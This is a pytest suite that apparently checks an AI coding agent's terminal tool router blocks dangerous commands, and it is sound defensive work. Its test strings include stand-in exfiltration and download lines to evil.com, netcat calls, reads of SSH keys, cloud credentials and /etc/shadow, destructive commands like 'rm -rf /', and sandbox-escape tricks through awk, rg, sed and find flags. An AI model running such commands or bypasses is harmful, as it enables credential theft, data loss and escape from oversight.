# SPDX-FileCopyrightText: 2026 Cisco Systems, Inc. and its affiliates
#
# SPDX-License-Identifier: Apache-2.0

"""Comprehensive coverage of commands that must be BLOCKED.

Every test here verifies that a dangerous, mutating, or policy-violating
command is rejected. A failure means the safety boundary has a gap.
"""

from __future__ import annotations

from pathlib import Path

import pytest

from antares_cli.agent.tool_router import ToolRouter


@pytest.fixture()
def repository(tmp_path: Path) -> Path:
    """Create a repository with files to protect."""
    (tmp_path / "src").mkdir()
    (tmp_path / "src" / "main.py").write_text("print('hello')\n", encoding="utf-8")
    (tmp_path / "src" / "config.py").write_text("SECRET = 'abc'\n", encoding="utf-8")
    (tmp_path / "data.txt").write_text("one\ntwo\nthree\n", encoding="utf-8")
    (tmp_path / "script.sh").write_text("#!/bin/bash\necho pwned\n", encoding="utf-8")
    (tmp_path / "Makefile").write_text("all:\n\techo build\n", encoding="utf-8")
    (tmp_path / ".env").write_text("API_KEY=secret123\n", encoding="utf-8")
    return tmp_path


@pytest.fixture()
def router(repository: Path) -> ToolRouter:
    return ToolRouter(repository)


def _assert_blocked(router: ToolRouter, command: str, *, substring: str = "") -> None:
    result = router.execute("terminal", {"command": command})
    assert not result.success, f"Command should be BLOCKED: {command!r}"
    if substring:
        assert substring.lower() in (result.error_message or "").lower(), (
            f"Expected '{substring}' in error for: {command!r}\nGot: {result.error_message}"
        )


# ---------------------------------------------------------------------------
# Disallowed executables
# ---------------------------------------------------------------------------


class TestDisallowedExecutables:
    def test_python(self, router: ToolRouter) -> None:
        _assert_blocked(router, "python -c 'print(1)'", substring="not allowlisted")

    def test_python3(self, router: ToolRouter) -> None:
        _assert_blocked(
            router, "python3 -c 'import os; os.system(\"id\")'", substring="not allowlisted"
        )

    def test_bash(self, router: ToolRouter) -> None:
        _assert_blocked(router, "bash -c 'echo pwned'", substring="not allowlisted")

    def test_sh(self, router: ToolRouter) -> None:
        _assert_blocked(router, "sh -c 'cat /etc/passwd'")

    def test_node(self, router: ToolRouter) -> None:
        _assert_blocked(router, "node -e 'console.log(1)'", substring="not allowlisted")

    def test_perl(self, router: ToolRouter) -> None:
        _assert_blocked(router, "perl -e 'system(\"id\")'", substring="not allowlisted")

    def test_ruby(self, router: ToolRouter) -> None:
        _assert_blocked(router, "ruby -e 'system(\"id\")'", substring="not allowlisted")

    def test_rm(self, router: ToolRouter) -> None:
        _assert_blocked(router, "rm src/main.py", substring="not allowlisted")

    def test_rm_recursive(self, router: ToolRouter) -> None:
        _assert_blocked(router, "rm -rf src/", substring="not allowlisted")

    def test_chmod(self, router: ToolRouter) -> None:
        _assert_blocked(router, "chmod 777 src/main.py", substring="not allowlisted")

    def test_chown(self, router: ToolRouter) -> None:
        _assert_blocked(router, "chown root src/main.py", substring="not allowlisted")

    def test_mv(self, router: ToolRouter) -> None:
        _assert_blocked(router, "mv src/main.py src/moved.py", substring="not allowlisted")

    def test_cp(self, router: ToolRouter) -> None:
        _assert_blocked(router, "cp src/main.py src/copy.py", substring="not allowlisted")

    def test_wget(self, router: ToolRouter) -> None:
        _assert_blocked(router, "wget http://evil.com/payload", substring="not allowlisted")

    def test_curl(self, router: ToolRouter) -> None:
        _assert_blocked(router, "curl http://evil.com/exfil", substring="not allowlisted")

    def test_nc(self, router: ToolRouter) -> None:
        _assert_blocked(router, "nc evil.com 4444", substring="not allowlisted")

    def test_dd(self, router: ToolRouter) -> None:
        _assert_blocked(
            router, "dd if=/dev/zero of=bomb bs=1M count=100", substring="not allowlisted"
        )

    def test_mkfs(self, router: ToolRouter) -> None:
        _assert_blocked(router, "mkfs.ext4 /dev/sda")

    def test_kill(self, router: ToolRouter) -> None:
        _assert_blocked(router, "kill -9 1", substring="not allowlisted")

    def test_pkill(self, router: ToolRouter) -> None:
        _assert_blocked(router, "pkill -f python", substring="not allowlisted")

    def test_xargs(self, router: ToolRouter) -> None:
        _assert_blocked(router, "find . | xargs rm", substring="not allowlisted")

    def test_env(self, router: ToolRouter) -> None:
        _assert_blocked(router, "env bash", substring="not allowlisted")

    def test_sudo(self, router: ToolRouter) -> None:
        _assert_blocked(router, "sudo cat /etc/shadow")

    def test_su(self, router: ToolRouter) -> None:
        _assert_blocked(router, "su root", substring="not allowlisted")

    def test_ssh(self, router: ToolRouter) -> None:
        _assert_blocked(router, "ssh user@host", substring="not allowlisted")

    def test_scp(self, router: ToolRouter) -> None:
        _assert_blocked(router, "scp file user@host:/tmp/", substring="not allowlisted")

    def test_git(self, router: ToolRouter) -> None:
        _assert_blocked(router, "git log", substring="not allowlisted")

    def test_make(self, router: ToolRouter) -> None:
        _assert_blocked(router, "make all", substring="not allowlisted")

    def test_docker(self, router: ToolRouter) -> None:
        _assert_blocked(router, "docker exec container bash", substring="not allowlisted")

    def test_pip(self, router: ToolRouter) -> None:
        _assert_blocked(router, "pip install evil-package", substring="not allowlisted")

    def test_apt(self, router: ToolRouter) -> None:
        _assert_blocked(router, "apt install netcat", substring="not allowlisted")

    def test_tee(self, router: ToolRouter) -> None:
        _assert_blocked(router, "echo pwned | tee output.txt", substring="not allowlisted")

    def test_touch(self, router: ToolRouter) -> None:
        _assert_blocked(router, "touch newfile.txt", substring="not allowlisted")

    def test_mkdir(self, router: ToolRouter) -> None:
        _assert_blocked(router, "mkdir -p new/directory", substring="not allowlisted")

    def test_ln(self, router: ToolRouter) -> None:
        _assert_blocked(router, "ln -s /etc/passwd link")

    def test_tar(self, router: ToolRouter) -> None:
        _assert_blocked(router, "tar czf archive.tar.gz src/", substring="not allowlisted")

    def test_zip(self, router: ToolRouter) -> None:
        _assert_blocked(router, "zip -r out.zip src/", substring="not allowlisted")

    def test_cd(self, router: ToolRouter) -> None:
        _assert_blocked(router, "cd /tmp && ls")


# ---------------------------------------------------------------------------
# Shell expansion and injection
# ---------------------------------------------------------------------------


class TestShellExpansionBlocked:
    def test_command_substitution_dollar(self, router: ToolRouter) -> None:
        _assert_blocked(router, "cat $(echo /etc/passwd)")

    def test_command_substitution_backtick(self, router: ToolRouter) -> None:
        _assert_blocked(router, "cat `echo /etc/passwd`")

    def test_variable_expansion(self, router: ToolRouter) -> None:
        _assert_blocked(router, "cat $HOME/.bashrc", substring="shell expansion")

    def test_variable_expansion_braces(self, router: ToolRouter) -> None:
        _assert_blocked(router, "cat ${HOME}/.bashrc", substring="shell expansion")

    def test_tilde_expansion(self, router: ToolRouter) -> None:
        _assert_blocked(router, "cat ~/secret.txt", substring="shell expansion")

    def test_arithmetic_expansion(self, router: ToolRouter) -> None:
        _assert_blocked(router, "echo $((1+1))", substring="shell expansion")

    def test_process_substitution(self, router: ToolRouter) -> None:
        _assert_blocked(router, "diff <(cat file1) <(cat file2)", substring="")

    def test_backtick_in_argument(self, router: ToolRouter) -> None:
        _assert_blocked(router, "grep `whoami` src/main.py", substring="shell expansion")

    def test_dollar_in_double_quotes(self, router: ToolRouter) -> None:
        _assert_blocked(router, 'grep "$USER" src/main.py', substring="shell expansion")

    def test_nested_command_substitution(self, router: ToolRouter) -> None:
        _assert_blocked(router, "echo $(cat $(find / -name passwd))")


# ---------------------------------------------------------------------------
# Shell redirects and operators
# ---------------------------------------------------------------------------


class TestRedirectsBlocked:
    def test_output_redirect(self, router: ToolRouter) -> None:
        _assert_blocked(router, "cat src/main.py > /tmp/stolen.txt")

    def test_append_redirect(self, router: ToolRouter) -> None:
        _assert_blocked(router, "echo pwned >> /tmp/log.txt")

    def test_input_redirect(self, router: ToolRouter) -> None:
        _assert_blocked(router, "sort < data.txt", substring="operator")

    def test_heredoc(self, router: ToolRouter) -> None:
        _assert_blocked(router, "cat << EOF", substring="operator")

    def test_background_operator(self, router: ToolRouter) -> None:
        _assert_blocked(router, "sleep 100 &", substring="operator")

    def test_stderr_redirect(self, router: ToolRouter) -> None:
        _assert_blocked(router, "cat missing 2> /dev/null", substring="")


# ---------------------------------------------------------------------------
# Mutating flags on allowlisted commands
# ---------------------------------------------------------------------------


class TestMutatingFlagsBlocked:
    def test_sed_in_place(self, router: ToolRouter) -> None:
        _assert_blocked(router, "sed -i 's/hello/bye/' src/main.py", substring="read-only")

    def test_sed_in_place_backup(self, router: ToolRouter) -> None:
        _assert_blocked(router, "sed -i.bak 's/a/b/' src/main.py", substring="read-only")

    def test_sed_in_place_gnu(self, router: ToolRouter) -> None:
        _assert_blocked(router, "sed --in-place 's/a/b/' src/main.py", substring="read-only")

    def test_sed_write_flag(self, router: ToolRouter) -> None:
        _assert_blocked(router, "sed 's/a/b/w output.txt' src/main.py", substring="read-only")

    def test_sed_execute_flag(self, router: ToolRouter) -> None:
        _assert_blocked(router, "sed 's/a/id/e' src/main.py", substring="read-only")

    def test_find_delete(self, router: ToolRouter) -> None:
        _assert_blocked(router, "find . -name '*.pyc' -delete", substring="read-only")

    def test_find_exec(self, router: ToolRouter) -> None:
        _assert_blocked(router, "find . -name '*.py' -exec rm {} \\;", substring="read-only")

    def test_find_ok(self, router: ToolRouter) -> None:
        _assert_blocked(router, "find . -name '*.py' -ok rm {} \\;", substring="read-only")

    def test_find_fprint(self, router: ToolRouter) -> None:
        _assert_blocked(router, "find . -name '*.py' -fprint output.txt", substring="read-only")

    def test_sort_output_flag(self, router: ToolRouter) -> None:
        _assert_blocked(router, "sort -o sorted.txt data.txt", substring="read-only")

    def test_sort_output_long(self, router: ToolRouter) -> None:
        _assert_blocked(router, "sort --output sorted.txt data.txt", substring="read-only")

    def test_sort_output_equals(self, router: ToolRouter) -> None:
        _assert_blocked(router, "sort --output=sorted.txt data.txt", substring="read-only")

    def test_sort_clustered_output(self, router: ToolRouter) -> None:
        _assert_blocked(router, "sort -uo sorted.txt data.txt", substring="read-only")

    def test_sort_compress_program(self, router: ToolRouter) -> None:
        _assert_blocked(router, "sort --compress-program=gzip data.txt", substring="read-only")

    def test_tree_output_flag(self, router: ToolRouter) -> None:
        _assert_blocked(router, "tree -o tree.txt", substring="read-only")

    def test_tree_output_long(self, router: ToolRouter) -> None:
        _assert_blocked(router, "tree --output=tree.txt", substring="read-only")

    def test_tree_fromfile(self, router: ToolRouter) -> None:
        _assert_blocked(router, "tree --fromfile", substring="read-only")

    def test_tree_fromtabfile(self, router: ToolRouter) -> None:
        _assert_blocked(router, "tree --fromtabfile", substring="read-only")

    def test_uniq_output_file(self, router: ToolRouter) -> None:
        _assert_blocked(router, "uniq data.txt output.txt", substring="read-only")

    def test_file_compile(self, router: ToolRouter) -> None:
        _assert_blocked(router, "file --compile magic.mgc", substring="read-only")

    def test_file_compile_short(self, router: ToolRouter) -> None:
        _assert_blocked(router, "file -C magic.mgc", substring="read-only")


# ---------------------------------------------------------------------------
# Nested execution via allowlisted commands
# ---------------------------------------------------------------------------


class TestNestedExecutionBlocked:
    def test_awk_argv_path_escape_is_not_allowlisted(self, router: ToolRouter) -> None:
        command = (
            'awk \'BEGIN{ARGV[1]="/" "etc" "/" "passwd";ARGC=2} '
            'NR==1 {print "HOST_READ_SUCCEEDED"; exit}\''
        )
        _assert_blocked(router, command, substring="not allowlisted")

    def test_awk_native_extension_loading_is_not_allowlisted(self, router: ToolRouter) -> None:
        _assert_blocked(router, "awk --load=payload '{print}'", substring="not allowlisted")

    def test_rg_pre_processor(self, router: ToolRouter) -> None:
        _assert_blocked(router, "rg --pre=cat pattern src/", substring="nested")

    def test_rg_search_zip(self, router: ToolRouter) -> None:
        _assert_blocked(router, "rg --search-zip pattern src/", substring="nested")

    def test_rg_search_zip_short(self, router: ToolRouter) -> None:
        _assert_blocked(router, "rg -z pattern src/", substring="nested")

    def test_rg_hostname_bin(self, router: ToolRouter) -> None:
        _assert_blocked(router, "rg --hostname-bin=/usr/bin/hostname pattern src/")

    def test_file_uncompress(self, router: ToolRouter) -> None:
        _assert_blocked(router, "file --uncompress src/main.py", substring="nested")

    def test_file_uncompress_short(self, router: ToolRouter) -> None:
        _assert_blocked(router, "file -z src/main.py", substring="nested")

    def test_file_no_sandbox(self, router: ToolRouter) -> None:
        _assert_blocked(router, "file --no-sandbox src/main.py", substring="nested")

    def test_file_files_from(self, router: ToolRouter) -> None:
        _assert_blocked(router, "file -f filelist.txt", substring="path list")

    def test_file_files_from_long(self, router: ToolRouter) -> None:
        _assert_blocked(router, "file --files-from=filelist.txt", substring="path list")

    def test_clustered_file_z(self, router: ToolRouter) -> None:
        _assert_blocked(router, "file -bz src/main.py", substring="nested")

    def test_clustered_rg_z(self, router: ToolRouter) -> None:
        _assert_blocked(router, "rg -zU pattern src/", substring="nested")


# ---------------------------------------------------------------------------
# Sensitive paths
# ---------------------------------------------------------------------------


class TestSensitivePathsBlocked:
    def test_env_file(self, router: ToolRouter) -> None:
        _assert_blocked(router, "cat .env", substring="sensitive path")

    def test_glob_expansion_cannot_reveal_sensitive_path(self, tmp_path: Path) -> None:
        sensitive_file = tmp_path / ".ssh" / "id_rsa"
        sensitive_file.parent.mkdir()
        sensitive_file.write_text("private-key-material\n", encoding="utf-8")
        router = ToolRouter(tmp_path)

        _assert_blocked(router, "cat .s*/*", substring="sensitive path")

    def test_ssh_directory(self, router: ToolRouter) -> None:
        _assert_blocked(router, "cat .ssh/id_rsa", substring="sensitive path")

    def test_ssh_known_hosts(self, router: ToolRouter) -> None:
        _assert_blocked(router, "cat .ssh/known_hosts", substring="sensitive path")

    def test_aws_credentials(self, router: ToolRouter) -> None:
        _assert_blocked(router, "cat .aws/credentials", substring="sensitive path")

    def test_aws_config(self, router: ToolRouter) -> None:
        _assert_blocked(router, "cat .aws/config", substring="sensitive path")

    def test_gnupg_directory(self, router: ToolRouter) -> None:
        _assert_blocked(router, "ls .gnupg/", substring="sensitive path")

    def test_kube_config(self, router: ToolRouter) -> None:
        _assert_blocked(router, "cat .kube/config", substring="sensitive path")

    def test_etc_passwd(self, router: ToolRouter) -> None:
        _assert_blocked(router, "cat /etc/passwd", substring="")

    def test_etc_shadow(self, router: ToolRouter) -> None:
        _assert_blocked(router, "cat /etc/shadow", substring="")

    def test_sensitive_in_find(self, router: ToolRouter) -> None:
        _assert_blocked(router, "find .ssh/ -type f", substring="sensitive path")

    def test_sensitive_in_grep(self, router: ToolRouter) -> None:
        _assert_blocked(router, "grep -r password .aws/", substring="sensitive path")

    def test_sensitive_in_head(self, router: ToolRouter) -> None:
        _assert_blocked(router, "head .ssh/id_rsa", substring="sensitive path")

    def test_sensitive_mixed_case(self, router: ToolRouter) -> None:
        _assert_blocked(router, "cat .SSH/id_rsa", substring="sensitive path")

    def test_sensitive_nested(self, router: ToolRouter) -> None:
        _assert_blocked(router, "cat src/../.ssh/id_rsa", substring="sensitive path")

    def test_sensitive_in_rg_file_flag(self, router: ToolRouter) -> None:
        _assert_blocked(
            router, "rg --file=.ssh/authorized_keys pattern", substring="sensitive path"
        )


# ---------------------------------------------------------------------------
# Path escape attempts
# ---------------------------------------------------------------------------


class TestPathEscapeBlocked:
    def test_parent_directory_escape(self, router: ToolRouter, repository: Path) -> None:
        outside = repository.parent / "outside.txt"
        outside.write_text("stolen\n", encoding="utf-8")
        _assert_blocked(router, "cat ../outside.txt", substring="outside the repository")

    def test_deep_parent_escape(self, router: ToolRouter) -> None:
        _assert_blocked(router, "cat ../../../../etc/hosts", substring="outside the repository")

    def test_absolute_path(self, router: ToolRouter) -> None:
        _assert_blocked(router, "cat /etc/hosts", substring="")

    def test_absolute_path_in_find(self, router: ToolRouter) -> None:
        _assert_blocked(router, "find /tmp -type f", substring="")

    def test_absolute_directory_with_trailing_slash(self, router: ToolRouter) -> None:
        _assert_blocked(router, "find /etc/ -maxdepth 1", substring="outside")

    def test_absolute_workspace_path(self, router: ToolRouter, repository: Path) -> None:
        _assert_blocked(
            router,
            f"cat {repository}/src/main.py",
            substring="relative paths",
        )

    def test_parent_in_option_value(self, router: ToolRouter) -> None:
        _assert_blocked(router, "rg --file=../../etc/passwd pattern")

    def test_dot_dot_in_path(self, router: ToolRouter) -> None:
        _assert_blocked(router, "cat src/../../secret.txt", substring="outside the repository")

    def test_read_file_parent_escape(self, router: ToolRouter, repository: Path) -> None:
        outside = repository.parent / "secret.txt"
        outside.write_text("stolen\n", encoding="utf-8")
        result = router.execute("read_file", {"path": "../secret.txt"})
        assert not result.success
        assert "outside" in (result.error_message or "").lower()

    def test_read_file_absolute(self, router: ToolRouter) -> None:
        result = router.execute("read_file", {"path": "/etc/hosts"})
        assert not result.success


# ---------------------------------------------------------------------------
# Multiline and syntax abuse
# ---------------------------------------------------------------------------


class TestSyntaxAbuseBlocked:
    def test_multiline_command(self, router: ToolRouter) -> None:
        _assert_blocked(router, "cat src/main.py\nrm -rf /")

    def test_carriage_return(self, router: ToolRouter) -> None:
        _assert_blocked(router, "cat src/main.py\rrm -rf /")

    def test_empty_command(self, router: ToolRouter) -> None:
        result = router.execute("terminal", {"command": ""})
        assert not result.success

    def test_only_whitespace(self, router: ToolRouter) -> None:
        result = router.execute("terminal", {"command": "   "})
        assert not result.success


# ---------------------------------------------------------------------------
# Commands blocked even in skipped conditional branches
# ---------------------------------------------------------------------------


class TestConditionalBranchValidation:
    def test_false_and_rm(self, router: ToolRouter) -> None:
        _assert_blocked(router, "false && rm -rf src/")

    def test_true_or_python(self, router: ToolRouter) -> None:
        _assert_blocked(router, "true || python -c 'import os'", substring="not allowlisted")

    def test_find_delete_after_semicolon(self, router: ToolRouter) -> None:
        _assert_blocked(router, "ls; find . -delete")

    def test_sed_inplace_in_or_branch(self, router: ToolRouter) -> None:
        _assert_blocked(router, "grep pattern src/main.py || sed -i 's/a/b/' src/main.py")


# ---------------------------------------------------------------------------
# Path with special characters in option clusters
# ---------------------------------------------------------------------------


class TestOptionClusterPaths:
    def test_rg_f_with_parent_path(self, router: ToolRouter) -> None:
        _assert_blocked(router, "rg -f../patterns.txt src/")

    def test_grep_file_flag_outside(self, router: ToolRouter, repository: Path) -> None:
        outside = repository.parent / "evil_patterns.txt"
        outside.write_text(".*\n", encoding="utf-8")
        _assert_blocked(
            router,
            f"grep --file={outside} src/main.py",
        )


# ---------------------------------------------------------------------------
# Repository-controlled input lists
# ---------------------------------------------------------------------------


class TestRepositoryControlledInputsBlocked:
    def test_find_files0_from(self, router: ToolRouter) -> None:
        _assert_blocked(router, "find --files0-from=paths.txt", substring="path list")

    def test_wc_files0_from(self, router: ToolRouter) -> None:
        _assert_blocked(router, "wc --files0-from=list.txt", substring="path list")

    def test_du_files0_from(self, router: ToolRouter) -> None:
        _assert_blocked(router, "du --files0-from=list.txt", substring="path list")

    def test_sort_files0_from(self, router: ToolRouter) -> None:
        _assert_blocked(router, "sort --files0-from=list.txt", substring="path list")
